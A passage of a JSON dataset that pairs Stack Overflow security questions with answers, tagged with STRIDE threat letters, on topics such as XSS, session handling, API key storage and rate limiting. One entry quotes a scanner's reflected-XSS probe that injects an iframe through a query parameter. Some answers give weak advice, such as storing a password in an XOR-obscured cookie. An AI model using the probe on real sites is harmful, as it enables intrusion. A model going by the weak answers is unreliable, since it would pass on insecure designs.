    "Attack": " The function call socket.emit will send a message to Server, by this flow, anyone who access the web can easily modify Javascript code (use Chrome devtools, or Firebug) to send any message to Server.   This hack may cause harmful to system.   ",
    "Mitigation": " You cannot prevent user from modifying your Javascript code.  It can be copied from the browser, modified and then run again.  You cannot prevent that.  You must safeguard things without relying on any code protection.  Instead you must safeguard what the code can do so rogue code can't really cause any harm to any user other than perhaps itself.  The client can never be trusted.  The server must always authenticate and verify and not expose harmful commands.  You should verify or check every message on your server to see that it seems reasonable just like you should verify all form contents or Ajax calls being submitted to your server.  You should not expose any commands to the browser that are harmful to your server.  For example, one user should not be able to delete another user from a regular client page - ever.  Basically a regular user should only be able to modify their own stuff.  You can implement an authentication scheme for your service that applies to your webSocket connections too.  This will allow you to ban anyone from your service that causes harm or appears to be trying to cause harm.  You can implement various rate limiting schemes that bound how much any given user can do with your server in order to protect the integrity and load of your server.  You can prevent various types of automated operations by requiring a captcha or captcha-like step in the process (something that requires an actual user).  Also, keep in mind that by definition, all a socket.io client can do is send a message to the server.  It is your job not to expose any harmful messages and to verify the authenticity or origin of any commands that might need that type of verification or could be misused.  For example, there is absolutely no reason to expose a command for [CODE].  You could expose a command for a user to delete themselves, but that's pretty much it for delete.  A regular user should never be able to delete another user.  FYI, all these same issues apply to Ajax calls and form POSTs.  They are exactly the same issue and are not unique to webSocket as they all involve an untrusted client sending your server whatever they feel like sending.  You have to make your server safe from that while assuming you have no control over what the client might try to do. "
  },
  {
    "Threat": "I",
    "Attack": " I understand that I probably won't stop a determined hacker with access to my source code, but storing them as plaintext feels wrong. ",
    "Mitigation": " For client-side Windows apps there is a [LINK] class, which    ...provides protection using the user or machine credentials to encrypt or decrypt data  So as long as user's profile is safe, so are data items protected with this class. However, if user's password is reset (not changed by user himself), all data is effectively lost. "
  },
  {
    "Threat": "S",
    "Attack": " There's a well-known caveat about not trusting the MIME type sent via file upload in PHP ([CODE]) as this is sent by the HTTP client and could therefore be forged.  There's a similar caveat for the file name ([CODE]), which is sent by the HTTP client and could contain potentially dangerous characters.  However, I can't see how the file size ([CODE]) could be forged, as it does not seem to be part of the request payload, at least I can't see it in the dev tools in Chrome, where the payload looks like:  Can the file size be part of the request payload, and therefore be forged, or is it always inferred from the actual file pointed to by [CODE], and therefore always trustable? ",
    "Mitigation": " As suggested by [LINK], I checked the PHP source in [LINK].  The lines involved in defining the [CODE] attribute are:  [CODE]  Which I translate as:  [LINK] The temp file is written in [CODE] size chunks[LINK] In each iteration, [CODE] is added to [CODE][LINK] [CODE] is assigned to the [CODE] zval[LINK] The target variable name [CODE] is assigned to [CODE][LINK] [CODE] is registered under the name contained in [CODE], [CODE]  So without doubt, the only variable ever assigned to [CODE] is the actual number of bytes written to the temporary file whose path is assigned to [CODE].  As far as I can see, there is no way to forge the [CODE] attribute. "
  },
  {
    "Threat": "E",
    "Attack": " I used a sensitive password with the superuser I created and I do not want it to be compromised by uploading the source code to GitHub. ",
    "Mitigation": " In general, and as long as your [CODE] does not include sensitive information, uploading your Django project to GitHub will not compromise your super user account. Your user information is stored in your database, which should not be included in your Git repository.The most likely situation where this might be a problem is if you are using SQLite, a file-based database. If you are, make sure that your database file is not (and has never been) checked into your repository. "
  },
  {
    "Threat": "I",
    "Attack": " I am using getObject and putObject requests on Amazon S3 and in creating a policy for access to the bucket I discovered that if I don't allow listBucket I get an 'access denied' error.  The problem with this is that listBucket means a user can list the keys in a bucket and this presentsa security threat.  Is it possible to allow getObject and putObject without allowing listBucket?or is there a workaround for this? ",
    "Mitigation": " From the [LINK]:    You need the [CODE] permission for this operation.  For more information, go to Specifying Permissions in a Policy in the Amazon Simple Storage Service Developer Guide. If the object you request does not exist, the error Amazon S3 returns depends on whether you also have the [CODE] permission.  I've confirmed this behavior by editing a policy that was essentially identical to yours.  I am able to get an existing object without trouble, whether or not I have the [CODE] privilege, as long as I have the [CODE] privilege.  The behavior changes only if I don't also have the [CODE] privilege, and I request an object that does not exist.  In that case, S3 will not admit to me whether that object exists -- I'm denied access to knowledge about the existence of the object, since I'm not authorized to see the list.  Response for a valid request to a nonexistent object, without [CODE]:  [CODE]  Response for a valid request for the same nonexistent object, with [CODE]:  [CODE]  So, on objects that don't actually exist, \"access denied\" is the expected response without [CODE].  Otherwise, it works as expected. "
  },
  {
    "Threat": "E",
    "Attack": " I'm working on a legacy rails application and the controllers have many instances of [CODE]. When running a Brakeman scan on it, [CODE] opens up the application to mass assignment vulnerabilities. ",
    "Mitigation": " [CODE] whitelists all attributes leading to the vulnerabilities of mass assignment. The best way to get around this is by whitelisting only the necessary attributes like so  [CODE]  Even better, use [LINK] with [LINK]    Allows you to choose which attributes should be whitelisted for mass  updating and thus prevent accidentally exposing that which shouldn't  be exposed. Provides two methods for this purpose: require and permit.  The former is used to mark parameters as required. The latter is used  to set the parameter as permitted and limit which attributes should be  allowed for mass updating.  [CODE] "
  },
  {
    "Threat": "I",
    "Attack": " For that I record in their database their key (s) API and the connection is done. But from a security point of view, if my database comes to be hacked despite all the predispositions taken in terms of security (prepared requests etc) ... These are all the API keys of my clients that are revealed and also email addresses of their own customers that can be retrieved, used, resold ... Because the tools I connect essentially allows to store contacts, organize and send emails.  So I wonder what is the best practice to allow my clients to use the API of their favorite tools without endangering the security of their own accounts and data of their customers (emails, etc). I am aware that currently launching my web application with this data in clear in database would be dangerous. ",
    "Mitigation": " All of the solutions you mentioned are somewhat valid and a combination is most likely the best answer. Your application needs access to these API keys so it's not really possible for a hacker to gain full control of your application and not gain control to the API keys. Full control being the key part - you can make it a lot harder to get to them.  <h3>Encryption</h3>  You would need encrypt them, not hash them, with something like AES. As you need to be able to decrypt them and use them in your requests towards the 3rd parties. This will help you protect against, eg. a database leak - if someone gets your database they would have to crack the encryption to get to them (as long as the encryption is properly implemented). The encryption/decryption key would of course have to be NOT in the database otherwise the whole thing has no point :)  <h3>Separation</h3>  Different database also makes sense - if someone dumps your main database they won't get to the API keys database and would have to get deeper into the application to access this database (ideally would be a completely separate DB server only accessible from your application).  Architecture of the solution matters too - you can have one server posing as a web-interface that is internet facing and that would talk to the backend server that is not internet facing over some limited (as much as possible) API to lower the attack surface. Only the backend server would then have access to the keys database and would perform the requests to the 3rd parties. Now an attacker has to jump through several servers to get even close to the keys.    Combining the above-mentioned will ensure one would have to obtain full control of your application (and all its parts) to get to the keys, the encryption key and bypass whatever other protection you might put in place. "
  },
  {
    "Threat": "E",
    "Attack": " It lead to an interesting finding quite fast: they are astonishingly lots of attempts to circumvent security and exploit vulnerabilities in standard software packages that are commonly found on sites, like phpmyadmin, forums, etc. ",
    "Mitigation": " Your method of blacklisting IPs outside the US will be a little effective for a short time, but is really going to be a losing battle in the long run.  If you can exclude IPs outside the US without affecting your user base, you can utilize a service like [LINK] to identify the country in PHP code and refuse access for those outside.  Loading these in a list or array in the header file is likely to get unwieldy after a while and possibly affect performance.  You would be better off to store the ban list in a database and check IPs when establishing a session in your site.  However, the most important course of action is to always make sure that your 3rd party software packages like forums, blogs, wikis, etc, are kept up to date with security patches.  The exploits for common web applications are very well known and widely publicized so it's crucial to keep them patched.  Addendum Make a habit of perusing [LINK] occasionally to keep abreast of new exploits. "
  },
  {
    "Threat": "E",
    "Attack": " We've hired a security consultant to perform a pentest on our Application's public IP (Kubernetes Loadbalancer) and write a report on our security flaws and the measurements required to avoid them. Their report warned us that we have TCP Timestamp enabled, and from what I've read about the issue, It would allow an attacker to predict boot time of the machine thus being able to grant control over it. ",
    "Mitigation": "   Vulnerabilities in TCP Timestamps Retrieval is a Low risk vulnerability that is one of the most frequently found on networks around the world. This issue has been around since at least 1990 but has proven either difficult to detect, difficult to resolve or prone to being overlooked entirely.    --  [LINK]  I would encourage you to look on this video: [LINK].   <h3>What about GKE</h3>  Getting the information about boot time (uptime in this case) can lead to knowledge about what security patches are not applied to the cluster. It can lead to exploitation of those unpatched vulnerabilities.    The best way to approach that would be regularly update existing cluster. GKE implements 2 ways of doing that:   [LINK][LINK]  Even if attacker knows the boot time of your machine it will be useless because system is up to date and all the security patches are applied. There is dedicated site for Kubernetes engine security bulletins: [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " Recently I studied a lot related to XSS attacks. I was searching for prevention techniques of XSS attack.  ",
    "Mitigation": " When it comes to security, the answer is always both/all/everything so long as you have the time.  They are both beneficial in their own right.  I'd argue CSP is more beneficial long term, but I'm highly biased.  EDIT based on completely valid comment  CSP is not supported by all user agents, whereas anti-sammy is user-agent agnostic.  "
  },
  {
    "Threat": "I",
    "Attack": " My problem is that I feel the password would likely be intercepted. In (1), the hash could be extracted by a man-in-the-middle attack. The attacker can now simply use that hash to get access to the user's information.  In (2), the attacker can intercept the plain-text password, and use that to gain access to the user's account. ",
    "Mitigation": " Let's start from the beginning.  Salt each password [LINK].Hash the combination of salt+passTransmit BOTH the salt and hash over an encrypted, or private channelStore BOTH the salt and hash in a database, or a text file, or whatever the hell you want (A database has the added bonus of requiring additional authentication, security is layers)When the user enters their pass again (over an encrypted or private channel), you hash it with the same algorithm, using the salt that you stored earlier.If the resulting hash matches, they are authenticated, if not, tell them they got EVERYTHING wrong.    Can the salt be generated server-side (to ensure it's unique) then sent to the client, before the password is salted and hashed?  You should absolutely perform the salting server-side to ensure you have maximum control over this process. Never allow the user, client, or device to make their own salt.    Could the salt and hash be used to gain access to a user's account? Is the encrypted channel meant to prevent any man-in-the-middle attacks?  If somebody gains access to all of the stored hashes and salts, they could try to do a bruteforce/dictionary attack to try to get a matching hash, but they could only ever do them very slowly, since every hash has a different salt.  Keep in mind that if a person has a short or weak password, theirs can still be cracked quickly.  If they all have the same salt, when they crack one, they essentially crack all of them.  The encrypted channel is to prevent people from listening in on the communication between client and server. It does not guarantee that it will stop a MITM attack, but it should add a layer of protection in the fact that the MITM cannot validate themselves as you/your organization.    How do I ensure that the channel between my android app and Google App Engine is secure?  It depends, is it over the web? Use HTTPS and validate your application with an SSL certificate, with Extended Validation if it is in your budget. "
  },
  {
    "Threat": "I",
    "Attack": " But, we have a security concern.What if some bad person would take advantage of the indirect access to Win API?  Downloading plugins for our program becomes as dangerous as an .exe file. ",
    "Mitigation": " Well I don't know of any explicit methods in AS3. But here is what I propose :  Before WinAPI is accessed, let there be a callback to the main SWF to authorize the request.If the request is made by the main SWF then the authorization shouldbe a success. If the child SWF makes the request, the main SWf shall deny the request.    EDIT  The child swf may not really ovverride the main swf call. If it does you may actually ovveride it back from the main. Besides isn't the externalInterface for the child, the main swf.  Either ways, it would be hard for the plugin writer to know even the signature of authentication function unless you share it. "
  },
  {
    "Threat": "E",
    "Attack": "   If the session identifier were known by an attacker who had access to  the user's workstation, the logged out session could be accessed using  the session cookie after the user had terminated their session.  ",
    "Mitigation": " In ASP.net [CODE] is not sufficient for this task, it does not remove the session ID cookie from the user's browser, so any new request to the same application, after the session is abandoned, will use the same session ID and a new Session State instance! [LINK]. You need to abandon the session and clear session ID cookie:  [CODE]  It's also a good practice to change the Form Authentication cookie name, in your [CODE] file:  [CODE]  Here's a good article on [LINK] and how to resolve it. "
  },
  {
    "Threat": "T",
    "Attack": " I was wondering, nowadays with the most recent versions of sh, bash, ksh etc. is it possible to get command injection by executing this (very simple) script?  Despite of the fact that one can already execute code if they have a shell of course, I am just wondering if a variable can contain malicious code like for example in PHP:  ",
    "Mitigation": " It will not works:  [CODE]  But if you use like this, yes, it will work:  [CODE] "
  },
  {
    "Threat": "E",
    "Attack": " Apache Log4J vulnerability [LINK] is impacting a number of cloud services.I am using log4j in my Android application.How does it impact it or is there no impact at all?I am assuming since the malicious actor could only run local scripts, it should not be an issue but I wanted to confirm. ",
    "Mitigation": " Seems like Android apps are safe since JNDI isn't available on Android. I believe the following tweet was the first online mention of the vulnerability, and on the bottom of the second screenshot it says &quot;Java's JNDI is not available on Android&quot;.[LINK](original tweet got deleted [LINK]) "
  },
  {
    "Threat": "I",
    "Attack": " We need some way of authenticating a user login/session so that we don't allow people to see data or change settings they shouldn't.  The device is not intended to be directly exposed to the internet or be 100% impregnable to serious hacking (network security / separation is the customer's issue*), the security requirement is more about keeping the lower ranks from touching the blinkenlights ;) ",
    "Mitigation": " If you only want to protect against access:Any time there is a GET request, look for a cookie of the password.If the cookie isn't set, send back a HTML login form that POSTs password to server.If the server gets the POST data with the right password send back a \"logged in ok\" page that sets the COOKIE to the password. Then anyone who login (with the right password obviously) will have the cookie set in all future GET requets. Anyone who has never logged in will always see the login page. You can 'hide' it by setting two cookie values: A random number, and the XOR of the random and the password. This way clients won't be able to figure out what the values in the cookies are. If you go futher and XOR it with say the client IP, clients won't be able to copy the cookies to other computers. The server will always be able to un-do everything and figure out the password/ip from the random number and the other cookie values.  If you want to have simple encryption you could use XMLHTTPREQUESTS in javascript. Have the server encrypt data with a simple puesdo random number generator (or a simply XOR obsfuncitation or whatever) and have the client do the same thing backwards in javascript. You can have the server encrypt every page except say index.html, and in index.html you can have it so it XMLHTTPREQUESTS the other pages in javascript and decrypts them, then puts the contents into a div using innerHTML or whatever. "
  },
  {
    "Threat": "I",
    "Attack": " How to secure database credentials in a web application in case the server where PHP is gets compromised?Assume that in this problem's case we are not talking about shared hosting, VPS or anything alike, there's only one person who has access to the box that stores MySQL information.  How to ensure that malicious user will not be able to obtain the details needed for connection string for MySQL? Assume that the user has broken the root login of the linux box running PHP. ",
    "Mitigation": " The best solution here, if this is a main priority, would be to use stored procedures.  Stored procedures store the database queries inside the database, therefore just set them up, and then create a new MYSQL user with just stored procedure execution permissions. That way even if the application code was compromised they would only be able to manipulate a limited subset of your data, and they also gain no knowledge of the underlying database structure.   The negatives to this approach are maintainability, due to the fact your mixing application logic with your storage system, and it might not be portable across platforms.  If you want a simple solution, what hafichuk suggested might be better, just customize it to fit your needs. Unfortunately your script needs to be able to access the database, unless your web server and application server were on separate machines and communicated over some encrypted channel such as SSH, but then your just getting too complicated. It all depends how important protection really is to you, and how far your willing to go to ensure it. "
  },
  {
    "Threat": "T",
    "Attack": " If I provide an Edit page to let users change their own address, for example, it's a security risk to include the [CODE] field because a knowledgeable and malicious user could give themselves a free 10-year subscription by faking the date (even if I use [CODE]. So I am not including that field in any way on the Edit page html (via razor). ",
    "Mitigation": "   So far my best solution seems to be to create a custom ViewModel that omits the SubscribedThru date, but that seems a lot of duplication of fields, validation, etc.;  That is exactly what you should do to keep things neat &amp; tidy.  [LINK] eases the [CODE] variation headache. "
  },
  {
    "Threat": "T",
    "Attack": "   escapeshellcmd() should be used on the whole command string, and it  still allows the attacker to pass arbitrary number of arguments. For  escaping a single argument escapeshellarg() should be used instead. ",
    "Mitigation": " Try to avoid passing strings as command line arguments. Instead, write data to files and read from files. This way you can be sure that the data being passed stays unmodified.If you absolutely need to pass the strings as command line arguments, always make sure that they are alphanumeric.If you absolutely need to pass strings as command line arguments, using escapeshellcmd on the complete string is relatively safer. "
  },
  {
    "Threat": "I",
    "Attack": " I was reading this [LINK] when I was struck by @Slauma's link response (included [LINK]) to the chosen answer written by @reach4thelasers.  It's a blog post of how to crack ASP.NET's forms authentication wide open and collect the remote machine key in about half an hour's time. ",
    "Mitigation": " This was already addressed a long time ago: [LINK]   Scott Gu wrote about it at the time [LINK]  This SO question covers some the impact of the issue [LINK]  I would say that the main take away is that patches and upgrades in frameworks are are less dangerous than leaving production apps at an old framework, old patch level, something that the change control boards of large organizations see in reverse. They generally fear the patches &amp; updates more than the possibility of vulnerabilities in existing code. "
  },
  {
    "Threat": "E",
    "Attack": " I also read [LINK], telling me that I should not request all permissions, because I would then open up the users computer for malicious code. ",
    "Mitigation": " ..will I have to go with the &quot;sign my jar and request everything&quot;-approach?Yes.  JWS permissions come in 3 levels1, the only one where modifying threads is permitted, is [CODE].<h2>1) JWS security levels</h2>Sand-boxed.  Provides a very limited environment.  Access to things like printers and the local file-system is only permitted using the JNLP API services, which provide more limited forms of [CODE] after prompting the user.  Come with window banners.  Can only communicate with own server.[CODE] - provide those JNLP API services unprompted (after the user accepts the digitally signed code) removes the window banners.[CODE] - pretty much anything, including replacing the existing security manager (yes, even 'all permissions' code gets a security manager in JWS - it is just very lenient).Also chase the links from the [LINK] &amp; [LINK] pages.  I can personally recommend those summaries &amp; links. "
  },
  {
    "Threat": "T",
    "Attack": " How can I protect it against XSS attack. User table is in an external DB, so I cannot trust it. I have tried different approaches using sanitize and h but when I replace in my local DB user website by [CODE], javascript is still being executed when I click on the link. ",
    "Mitigation": " You can remove \"javascript:\" in the controller. That's ugly but works, with some caveats (browsers are awesome in what exactly they may accept as \"javascript:\"). This is not a very strong control.  You can add \"http://\" (or \"https://\") statically to the link href, and strip that from your user input. As \"javascript:\" only works if it's at the first character of an href, statically adding http:// as the beginning mitigates XSS.  You can also use the [CODE] [LINK] to prevent inline Javascript from being run. This has implications on how you can structure your code, and is not supported in all browsers, but when it is suported, it's an excellent control.  As always, implementing multiple layers of defense (multiple of the above) will make your application more robust and secure against attacks. "
  },
  {
    "Threat": "I",
    "Attack": " I'm developing a web application using socket.io.I'm currently using the socket id as an identifier which gets broadcast to other clients. Now this raised security concerns as to whether this id could be used to hijack another users session. Unfortunately it is extremely difficult to find any information on this online.  A client cannot do anything with a socket.id directly.  So, allowing the id to be known causes no new vulnerabilities on its own.  However, if your server allows things to be performed on a socket if only an ID is known, then you'd have to assess what the risks are for those operations that your server exposes.  We can't really comment on those since you haven't shown us any code or design.For example, if your server supported a message call &quot;buy&quot; and all that was needed was an id for a client to trigger a buy operation, then it could be a problem if you let the id be publicly known.  But as long as the only operations that operate on an id that your server makes available to the client are intended for the public to access on any socket (such as send them a message), then there should not be a problem.So - should the socket id be kept secret or can I safely use it as a public identifier?It is perfectly fine as a public identifier and that's one of the things that it is there for.  It should be used as an identifier (as in &quot;I want to send a message to Bob so I will tell the server to send a message to his id&quot;), but not as authorization.  After all, if you're making it public, then it isn't a secret so should not be used by your own server API for authorization.I guess I should've been a bit more specific. I was wondering whether it would be possible for a malicious user to pair their requests with a foreign socket object (which I use as a session cache) through packet forgery by supplying another socket id. I take from your answer that this is not the case - so thanks a lot!The socket.id is not used by socket.io in the transport itself.  So you can't do anything malicious such as pretending to be someone you aren't just because you know their [CODE]. ",
    "Mitigation": " A client cannot do anything with a socket.id directly.  So, allowing the id to be known causes no new vulnerabilities on its own.  However, if your server allows things to be performed on a socket if only an ID is known, then you'd have to assess what the risks are for those operations that your server exposes.  We can't really comment on those since you haven't shown us any code or design.For example, if your server supported a message call &quot;buy&quot; and all that was needed was an id for a client to trigger a buy operation, then it could be a problem if you let the id be publicly known.  But as long as the only operations that operate on an id that your server makes available to the client are intended for the public to access on any socket (such as send them a message), then there should not be a problem.So - should the socket id be kept secret or can I safely use it as a public identifier?It is perfectly fine as a public identifier and that's one of the things that it is there for.  It should be used as an identifier (as in &quot;I want to send a message to Bob so I will tell the server to send a message to his id&quot;), but not as authorization.  After all, if you're making it public, then it isn't a secret so should not be used by your own server API for authorization.I guess I should've been a bit more specific. I was wondering whether it would be possible for a malicious user to pair their requests with a foreign socket object (which I use as a session cache) through packet forgery by supplying another socket id. I take from your answer that this is not the case - so thanks a lot!The socket.id is not used by socket.io in the transport itself.  So you can't do anything malicious such as pretending to be someone you aren't just because you know their [CODE]. "
  },
  {
    "Threat": "E",
    "Attack": " I am trying to make sure my Jenkins instance is not exploitable with the latest log4j exploit.I have a pipeline script that runs, I tried following this instruction :[LINK]This is one of my stages of my pipeline script:[CODE]But I get a different error than what's described here and I'm unsure if I'm checking this correctly.  This is the error:[CODE] ",
    "Mitigation": " This is probably the easiest way to check if you Jenkins has the log4j vulnerability (through plugins or otherwise).Go to [LINK]Paste [CODE]If the output is [CODE] You're good then, otherwise you're not good.This way you don't have to change your pipeline to test or go through the approval process like mentioned in the [LINK], you can just paste and verify without needing to configure additionally. "
  },
  {
    "Threat": "I",
    "Attack": " In this case, how do I upload a video directly to Vimeo on the client side without compromising security? I assume it's not safe to reveal the API token on the client side and there's no setting in Vimeo that lets me restrict the origin URL for file uploading. ",
    "Mitigation": " Vimeo has a [LINK] for uploading videos from your own frontend with HTTP requests. "
  },
  {
    "Threat": "I",
    "Attack": " I want to know to secure my Xamarin code specially when deploying to Android. I know that Xamarin.iOS converts to native code but Xamarin.Android deploys the .Net code in DLL which can easily be decompiled using DotPeek or any other tool and the code will be visible including my encryption keys or any other security related data which is necessary for security between server and my app. Obfuscation is an option but I want to know any other options. Please guide me on this issue because it is of much concern to me. ",
    "Mitigation": " Just as you must take action to defend the Android-native code in your APK with tools like ProGuard, the .NET assembly that contains your app's business logic will require you to take special action to obfuscate, encrypt, or otherwise defend the assembly from those prying eyes. With a relatively small .NET toolchain and the interest to go spelunking through Intermediate Language code, one can learn quite a bit about how an app is put together.  Just to be clear, ProGuard only obfuscates the app's Java code, and offers no protection for .NET assemblies found within Xamarin-compiled APKs.  As pointed out in your question as well as within the question's commentary, tools like DotPeek, ildasm, ILSpy, and Reflector offer an incredibly easy (and in many cases free!) way to go inspect a .NET assembly and many of these tools offer mechanisms to transform substantial swaths of IL code back to a higher level .NET language like C# or VB.NET.  With a little additional effort, these higher-level classes can be plugged into a Visual Studio or Xamarin Studio solution and converted back to running code -- eep!  Since Xamarin.Android uses Just-In-Time compilation, in addition to a ProGuard-like solution on your Android-native code, you can implement an obfuscator like Babel for .Net or Crypto-Obfuscator for .Net that offer a host of developer-configurable obfuscation techniques/rules as well as options to encrypt parts of the assembly.  While these tools make the cat-and-mouse game of reverse engineering more difficult, we are ultimately talking about trying to protect client-side code; those that are determined to look at the underlying implementation and have the patience to do so will be able to hunt through the clues left in your binaries and assemblies to start to work out obfuscation or encryption techniques that are in use.  While there is no 100% secure tool, mechanism, or security approach, you can reduce risk by applying a layered approach to security with an eye towards the 'risk vs. costs/impact' of spending time both implementing a multi-layered approach and the additional complexity introduced by adoption of these additional security measures.  As [CODE] recommends, engaging a security professional to audit your application in the context of the rest of your organization's platforms can be an important step towards identifying additional areas for improvement, highlighting potential areas of concern or getting recommendations towards further improving your organization's selected approach to platform security. "
  },
  {
    "Threat": "T",
    "Attack": " I have a need to pass a value through the query string to be displayed on my page. The value will have to be encrypted as it contains some PII for the user viewing the page. And in order to make readable to the user, it needs to be able to be decrypted when displayed.I'm using PHP and research so far has led me to [CODE] and [CODE] along with these 2 code resources:[LINK][LINK]I liked #1 a lot because of the way the [CODE] was actually attached to the returned, encrypted string. This allows us NOT to have to store an [CODE] as a constant and to be able to generate a new one each time the function is called. This seems more secure to me than using the same [CODE] and [CODE] every time. Is it really though? And if so, is it for any reasons I should know about beyond the painfully obvious?. The thing I didn't like is that I think concatenating the [CODE] and [CODE] with a character/string (in this case [CODE]) that can be found occurring naturally in other potential cypher-text or [CODE] became problematic. Using this method, in attempting to encrypt 7000+ email addresses, a little over half of them ended up with these weird characters, [CODE]Among others) in the decoded string thus breaking it.#2 was great because it worked!! I've yet to find a string that will break it... especially in my email list. BUT as mentioned above, this requires. the [CODE] and [CODE] to always be the same values and stored in a variable somewhere. This seemed like 1 tiny maintenance issue, but more of a security thing.So I did a little more reading/thinking and came up [LINK] - here's the code:[CODE]So I guess my main questions are:am I right in thinking a solution that uses a dynamic [CODE] generated at the time the function is executed is more secure than having a static [CODE] defined well ahead of time and used for every encryption? If not, what am I missing?what openings for (potentially successful) attack so any/all of these approaches expose? How can they be fixed or modified to mitigate the riskAre any (hopefully the one I put together) of these approaches acceptable for being used in a production environment on a site that display's a user's PII - nothing banking or super-top-secret in nature - and allows him to make updates? It's being used in a PHP looking a little something like: [CODE]<h3>Quick note on #3:</h3>I'm guessing it would be FAR better to encrypt something that ISN'T PII (such as a user's unique id in the database) to send through the query string, then decrypt that value and use it to look up his email address with a DB query. And although I'll probably end up going that way in he end of it all, lets just say there factors in play at the moment (for which explaining would drag this question SO far off topic) that is preventing it from being even a remotely viable option.I think learning about what I've got here will carry over into the final solution nicely. I'd love to hear about anything done particularly poorly or well or just general comments in addition to answers to some of the formal questions I've posed throughout.Thanks in advance for any wisdom you care to share. ",
    "Mitigation": " Sorry for being lazy to adopt my example to your code but it should be not so complicated as the following code is a full sample for anAES GCM 256 string encryption with random IV. The IV and tag are prepended to the ciphertext and then Base64-encoded.Please note that the code does not have any error handling and is for educational purpose only ! Do not use static keys for encryption.Output:[CODE]code:[CODE] "
  },
  {
    "Threat": "T",
    "Attack": "   The issue here is a cross-site  scripting vulnerability that is  commonly associated with e-commerce  applications. One of the tests  appended a harmless script in a GET  request on the end of the your site  url. It flagged as a cross-site  scripting vulnerability because this  same script that was entered by the  user (our scanner) was returned by the  server unsanitized in the header. In  this case, the script was returned in  the header so our scanner flagged the  vulnerability.    Here is the test I ran from my  terminal to duplicate this:    GET  /?osCsid=%22%3E%3Ciframe%20src=foo%3E%3C/iframe%3E  HTTP/1.0      Host:(removed) ",
    "Mitigation": " It turned out that I have a Response.redirect for any pages which are accessed by https which don't need to be secure and this was returning the location as part of the redirect. Changing this to:  [CODE] "
  },
  {
    "Threat": "S",
    "Attack": " My question is this really a secured process because as soon hacker knows the pattern, he can simply login to jasper server ?To me looks like security can be compromised here.  Am i missing something here?   ",
    "Mitigation": "   JasperReports Server will accept any properly formatted token;  therefore, you need to protect the integrity of the token using  measures such as the following:         Connect to JasperReports Server using SSL to protect against token    interception.       Encrypt the token to protect against tampering.   Configure the token to use a timestamp to protect against replay attacks. Without a timestamp, when you include the token in a web page or REST web service URL, the URL can be copied and used by unauthorized people or systems. Setting the expire time for the token will stop tokens/URLs from being used to authenticate beyond the indicated time. You can set the expiry time depending on your use case. For a user who is logged into the application/portal and is requesting access to JasperReports Server, expiry time of a minute or less from the request time is appropriate.    All communications need to be made through an SSL tunnel. Otherwise, anyone could establish a connection to your JR server, send tokens and get information from it. "
  },
  {
    "Threat": "D",
    "Attack": " I'm new to CXF and I would like to know if it has any build-in mechanism that would allow limiting the number of concurrent calls to the web service, thus addressing the possibility of a DoS attack? Something similar to this feature of WCF? ",
    "Mitigation": " CXF has some ability to do some of this out of the box.   CXF endpoints can have a factory configured on the invoker which is used to obtain the Object that is invoked upon.  Out of the box, there is a [CODE] that can maintain a pool of instances.  It can be set to not create additional instances beyond the max and thus wait until more are freed up.  That can throttle things a bit.    You can configure this via spring config or via an annotation on the impl:  [CODE]  (25 is the max size of the pool)  However, this is very late in the processing.    By the time it reaches there, all the XML has been parsed, jaxb objects created, etc...  For DOS, you'd likely want to stop earlier.  You can implement an interceptor that would live early in the chain that would keep a count stored on the endpoint.   Increment and check on the incoming chain, decrement on the outgoing chain. "
  },
  {
    "Threat": "I",
    "Attack": " Why should we persist short-lived access_token? So far I can think of a two reasons agains this approach. First, potentially it could be a security threat when you are keeping user's access tickes anywhere, just waiting for someone to grab them, and reuse for unsuspicious resource server (remember, they should use the same algorithm to serilize/deserialize keys). Second, you would have to care about updating those persisted tickets once you decide to change any part of serialization algorithm. So, why don't we simply create new tickets in runtime once we've verified [CODE] and [CODE] instead of reading and deserializing it from database?How access_token should be encrypted, if we should persist it? Will salt + SHA2 on serialized ticket do the job or there is a better way?Why hash refresh_token id? From what kinds of attacks it actually protects? And won't it be more secure if we'd send hashed keys as [CODE] while keeping real key in the database? This way brute-force attack on the refresh_token (guessing refresh token of a random user) would have to guess hashing algorithm as well. ",
    "Mitigation": " 1 &amp; 2 - If you look on the source code for [CODE] [LINK] you will notice that this protected ticket is encrypted using the default DPAPI which depends on server machineKey for encryption. So if you grab it from DB you can't do anything with it unless you have the machineKey.  3 - If your DBA has access to this table and he can see the the plain refresh token identifiers then he can simple obtain new access token using those refresh token identifier using the grant_type (refresh_token) "
  },
  {
    "Threat": "D",
    "Attack": " However, I believe I've run into an issue with IP address spoofing. I know the real client will never receive a response back if they spoof their IP address, but that may not be necessary for a call such as a create account call. A client could effectively create a DoS attack by registering for many accounts, all with different IPs, all the while avoiding the rate limit. This would cause my system to send out a high volume of welcome emails (leading to my servers being marked as spam), and could prevent users from signing up if their email account was maliciously registered. How can this be avoided? ",
    "Mitigation": " Usually you would use a secret token (API key, login credentials or whatever) that identifies a user and count requests per user account.   Since you are attempting to limit the requests by IP I assume that you are about to create an \"open\" API where anybody may send requests too, without authentication.  The term *IP spoofing is not a problem in this case. This is because - unless he controls the routing between your server and the internet - the spoofing attacker will not get an answer (as you said). But HTTP(S) is transported over TCP and establishing a TCP connection requires the attacker to perform a successful handshake which requires to receive the connection ID from the server - meaning it requires to receive answers.  The Wikipedia Page of the TCP protocol might me a good external resource to start: [LINK]  You see IP spoofing isn't a problem. But you need to understand that rate limiting by IP isn't a good solution at all. That's because:  an abuser could request a new IP after the limit has been reachedyour API might be used by a large organization where internal IPs getNATed by the core router and you see only that core routers IP.  I would strongly encourage you to use authentication (together with SSL!) and limit requests on a per user base.    Answers to the listed questions in short (Can explain more if you want)    Does SSL prevent this form of IP spoofing?  No    Is there a way to make sure the client receives the server's response, thereby ensuring that it's not a spoofed IP address?  Yes, it is implemented in TCP -> see [CODE] in the wikipedia link above    Does cloudflare somehow verify the IP address is not spoofed when passing along the HTTP_CF_CONNECTING_IP header?  As explained above. HTTP traffic requires an established TCP connection. Therefore this makes no sense. "
  },
  {
    "Threat": "S",
    "Attack": " XHR other origin is blocked because of security reason, as an instance, attacker can post behalf of a user using GET request(Consider the fact that it is not possible because of lack of cookies). However, the above script tag will do the same(Same, cookies are not available). So why XHR GET request is not allowed? ",
    "Mitigation": " You can add a [CODE] tag to the document, but the browser will try to run the response as a script.  Unless the response is a valid script that's specifically designed to provide data using the JSONP convention, your code can't \"see\" anything that was in the response.You can add an [CODE] tag to the document and maybe load some of the user's personal photos from another site, but the image will only appear on the screen; you can't access the pixel data from JavaScript. "
  },
  {
    "Threat": "T",
    "Attack": " So, I want to know if this and only this little snippet presents any security issues (like xss attacks etc) ",
